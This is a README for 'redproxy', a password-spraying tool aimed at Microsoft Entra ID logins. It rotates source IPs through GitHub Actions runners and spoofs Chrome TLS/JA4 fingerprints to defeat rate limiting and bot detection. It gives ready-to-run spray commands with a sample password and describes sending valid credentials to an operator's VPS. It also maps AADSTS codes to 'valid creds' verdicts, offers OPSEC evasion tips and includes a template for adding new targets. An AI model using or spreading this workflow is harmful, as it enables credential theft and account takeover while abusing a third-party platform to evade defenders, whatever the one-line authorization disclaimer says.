<div align="center">

# 🔴 redproxy

**Stealth fingerprint proxy for authorized security research — IP rotation + JA4/TLS spoofing via GitHub Actions**

[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

</div>

---

## What is this?

redproxy routes HTTP requests through GitHub Actions runners for **automatic IP rotation** while spoofing TLS/HTTP fingerprints via [Thermoptic](https://github.com/mandatoryprogrammer/thermoptic) to match real Chrome browser signatures.

Each GitHub Actions workflow run gets a **fresh IP address**. Combined with Thermoptic's Chrome-based proxy, every request appears to come from a different real Chrome browser — defeating IP-based rate limiting, JA4 fingerprint detection, and basic bot detection simultaneously.

> **⚠️ Legal:** This tool is for **authorized security testing only**. Only use it against systems you have explicit written permission to test.

### Spoofing layers

| Layer | Spoofed | How |
|-------|---------|-----|
| **IP** | ✅ Rotated per run | GitHub Actions runners |
| **JA4** | ✅ Chrome TLS fingerprint | Thermoptic (real Chromium TLS stack) |
| **JA4H** | ✅ Chrome HTTP fingerprint | Thermoptic HTTP header ordering |
| **JA4X** | ✅ X.509 certificate | Thermoptic certificate handling |
| **JA4T** | ✅ TCP fingerprint | Thermoptic TCP stack |
| **User-Agent** | ✅ Real Chrome UA | Chromium browser process |
| **WebDriver** | ✅ Not detectable | `--disable-blink-features=AutomationControlled` |
| **Window Size** | ✅ Standard 1920×1080 | Chrome launch flags |

### Forks

This project combines and extends:
- [dunderhay/git-rotate](https://github.com/dunderhay/git-rotate) — GitHub Actions IP rotation
- [mandatoryprogrammer/thermoptic](https://github.com/mandatoryprogrammer/thermoptic) — Chrome-based TLS fingerprint proxy

## Architecture

```
┌─────────────┐     ┌──────────────────────────────────────────────┐
│   KICKER    │     │           GITHUB ACTIONS RUNNER              │
│  (your PC)  │     │  ┌─────────┐    ┌────────────────────────┐   │
│             │────▶│  │ SPRAYER │───▶│ THERMOPTIC PROXY       │   │
│ • Sets      │     │  │ (Python)│    │ (Chrome + mitmproxy)   │   │
│   secrets   │     │  └────┬────┘    │ • Real Chromium TLS    │   │
│ • Dispatches│     │       │         │ • JA4 fingerprint      │   │
│   workflows │     │       │         │ • Fresh IP per run     │   │──▶ TARGET
│ • Tracks    │     │       │         └────────────────────────┘   │
│   progress  │     │       │                                      │
└─────────────┘     └───────┼──────────────────────────────────────┘
                            │
                    ┌───────▼──────┐
                    │   CATCHER    │
                    │  (your VPS)  │
                    │ • Results    │
                    │ • AADSTS     │
                    │   parsing    │
                    │ • JSON logs  │
                    │ • /stats API │
                    └──────────────┘
```

### Overview
<img width="897" height="590" alt="Architecture overview" src="https://github.com/user-attachments/assets/34bf7a76-d99d-4a00-9a10-3324f8c3027c" />

### Demo

Different IP addresses with the same JA4 hash (impersonating Chrome):

<img width="1420" height="744" alt="Demo showing IP rotation with consistent JA4" src="https://github.com/user-attachments/assets/02a603ff-c5ae-4f4a-9e1f-47aef3a3b915" />

## Quick start

### Prerequisites

- Python 3.12+
- A GitHub repository (fork this one)
- A [fine-grained GitHub token](https://github.com/settings/tokens?type=beta) with: `actions:read/write`, `secrets:read/write`
- A VPS or server to run the catcher

### 1. Clone & configure

```bash
git clone https://github.com/g4nkd/redproxy.git
cd redproxy

# Option A: config file
cp kicker/config.ini.example kicker/config.ini
# Edit with your GitHub username, repo name, and token

# Option B: environment variables
export GITHUB_OWNER=your-username
export GITHUB_REPO=redproxy
export GITHUB_TOKEN=github_pat_xxxxx
```

### 2. Start the catcher (on your VPS)

```bash
cd catcher
pip install -r requirements.txt

# For Microsoft Entra ID spray results:
python catcher-microsoft-login.py --port 20005

# For fingerprint verification:
python catcher-fingerprint.py --port 20005
```

**Production:** Use Caddy as a reverse proxy with TLS — see `catcher/example_caddyfile.txt`.

### 3. Run the kicker

```bash
cd kicker
pip install -r requirements.txt

# Spray Microsoft Entra ID
python kicker.py \
  -u userlist.txt \
  -p 'Winter2024!' \
  -c https://your-vps.com/wow-amazing \
  --secure \
  --batch-size 5 \
  --delay 15

# Verify fingerprint / IP rotation
python kicker.py \
  -u userlist.txt \
  -p dummy \
  -c https://your-vps.com/wow-amazing \
  --secure \
  --workflow "View IP Rotating and JA4"

# Dry run (shows batches, dispatches nothing)
python kicker.py -u userlist.txt -p test -c http://localhost:20005/wow-amazing --dry-run

# Resume from batch 5
python kicker.py -u userlist.txt -p test -c http://localhost:20005/wow-amazing --resume 5
```

### 4. Monitor results

```bash
# Real-time stats
curl https://your-vps.com/stats

# Output files:
#   output/valid_creds.json  — successful + MFA-gated logins
#   output/all_results.json  — all attempts with verdicts
#   output/fingerprints.json — IP rotation + JA4 validation
```

## Components

### Kicker (`kicker/`)

The orchestrator. Reads a userlist, splits into batches, encrypts secrets via NaCl, dispatches GitHub Actions workflows.

| Feature | Description |
|---------|-------------|
| **Batch control** | `-b N` sets users per workflow, `-d N` delay between dispatches |
| **Resume** | `--resume N` skips first N batches |
| **Dry run** | `--dry-run` shows what would happen |
| **Rate limit handling** | Auto-retry on GitHub API 403 |
| **Env var config** | No config file needed with `GITHUB_OWNER/REPO/TOKEN` |

### Sprayer (`sprayer/`)

Runs inside GitHub Actions. Sends requests through Thermoptic proxy and reports back to catcher. Uses the **target plugin system** (`lib/targets/`).

### Catcher (`catcher/`)

Flask server that receives and processes results. Parses 15+ Entra ID AADSTS error codes into human-readable verdicts.

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/wow-amazing` | POST | Receive spray results |
| `/stats` | GET | Real-time statistics |
| `/health` | GET | Health check |

### Shared library (`lib/`)

- `common.py` — Logging, env vars, file I/O, structured JSON output
- `fingerprint.py` — JA4/TLS fingerprint verification through proxy
- `targets/` — Pluggable target system (Microsoft, Custom)

## Adding a target

Create `lib/targets/yourtarget.py`:

```python
from .base import TargetPlugin, SprayResult

class YourTarget(TargetPlugin):
    name = "yourtarget"
    description = "Your auth provider"

    def spray(self, username: str, password: str) -> SprayResult:
        # Send auth request through self.proxies
        ...

    def parse_response(self, result: SprayResult) -> dict:
        # Return structured verdict
        ...
```

Register in `lib/targets/__init__.py`.

## AADSTS error mapping

The Microsoft target parses these Entra ID error codes:

| Code | Verdict | Meaning |
|------|---------|---------|
| `AADSTS50126` | `invalid_password` | Valid user, wrong password |
| `AADSTS50055` | `password_expired` | **Valid creds** — password expired |
| `AADSTS50079` | `mfa_not_configured` | **Valid creds** — MFA not set up |
| `AADSTS50076` | `mfa_microsoft` | **Valid creds** — Microsoft MFA |
| `AADSTS50158` | `mfa_conditional` | **Valid creds** — Conditional access MFA |
| `AADSTS53003` | `conditional_access_blocked` | **Valid creds** — CA blocks token |
| `AADSTS53000` | `device_compliance` | **Valid creds** — Requires compliant device |
| `AADSTS530035` | `security_defaults` | **Valid creds** — Security defaults block |
| `AADSTS50053` | `account_locked` | ⚠ Smart lockout triggered |
| `AADSTS50057` | `account_disabled` | Account disabled |
| `AADSTS50034` | `user_not_found` | User doesn't exist |
| `AADSTS50128` | `invalid_tenant` | Invalid tenant |

## Fingerprint verification

Run the verification workflow to confirm your setup:

```bash
python kicker.py -u users.txt -p x -c https://your-vps/wow-amazing --workflow "View IP Rotating and JA4"
```

The fingerprint catcher validates:
- ✅ IP addresses rotate (different per request)
- ✅ JA4 hash matches Chrome
- ✅ No WebDriver / HeadlessChrome markers

## OPSEC

- Each workflow run uses a **different GitHub Actions runner IP**
- Thermoptic uses a **real Chromium process** for TLS — not library emulation
- Catcher exposes only `/wow-amazing`; Caddy returns 404 for everything else
- Use `--secure` + Caddy with TLS for encrypted catcher communication
- Results go directly from Actions runner → your catcher (never stored on GitHub)

## Project structure

```
redproxy/
├── kicker/                    # Orchestrator (runs on your machine)
│   ├── kicker.py
│   ├── config.ini.example
│   ├── userlist.txt
│   └── requirements.txt
├── sprayer/                   # Workers (run in GitHub Actions)
│   ├── sprayer-microsoft.py
│   ├── sprayer-verify-data.py
│   └── requirements.txt
├── catcher/                   # Result receiver (runs on your VPS)
│   ├── catcher-microsoft-login.py
│   ├── catcher-fingerprint.py
│   ├── example_caddyfile.txt
│   └── requirements.txt
├── lib/                       # Shared library
│   ├── common.py
│   ├── fingerprint.py
│   └── targets/
│       ├── base.py
│       ├── microsoft.py
│       └── custom.py
├── .github/workflows/
│   ├── sprayer.yml
│   └── viewip.yml
├── LICENSE
└── README.md
```

## License

MIT — see [LICENSE](LICENSE).
